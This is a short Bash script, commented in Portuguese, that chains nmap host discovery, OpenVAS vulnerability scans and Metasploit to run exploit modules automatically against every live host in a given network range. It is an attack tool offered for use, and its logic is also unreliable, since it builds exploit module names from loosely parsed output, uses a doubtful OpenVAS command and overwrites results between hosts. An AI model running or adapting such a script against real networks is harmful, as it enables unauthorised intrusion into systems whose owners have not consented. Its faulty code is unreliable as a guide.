#!/bin/bash

# Definindo variáveis
rede=$1 #exemplo 10.0.0.1/24
usuario_openvas=$2 #user openvas
senha_openvas=$3 #senha openvas
arquivo_saida_openvas=$4 #nome do arquivo de saida openvas

# Escaneamento de hosts ativos com o nmap
echo "Realizando escaneamento de hosts ativos com o nmap..."
nmap -sn $rede | grep "Nmap scan report" | awk '{print $5}' > hosts.txt

# Escaneamento de vulnerabilidades com o OpenVAS
while read -r host; do
  echo "Realizando escaneamento de vulnerabilidades no host $host com o OpenVAS..."
  openvas-cli --target=$host --username=$usuario_openvas --password=$senha_openvas --verbose --xml=$host.xml
done < hosts.txt

# Identificação da falha e escolha do módulo de exploit no Metasploit
while read -r host; do
  echo "Identificando falhas e escolhendo módulo de exploit no Metasploit para o host $host..."
  msfconsole -q -x "db_import $host.xml; services; vulns; exit" > metasploit_vulns.txt
  while read -r line; do
    service=$(echo $line | awk '{print $2}')
    vuln=$(echo $line | awk '{print $4}')
    echo "Selecionando e executando módulo de exploit para a vulnerabilidade $vuln no serviço $service no host $host..."
    msfconsole -q -x "use $service/$vuln; set RHOSTS $host; run; exit"
  done < metasploit_vulns.txt
done < hosts.txt
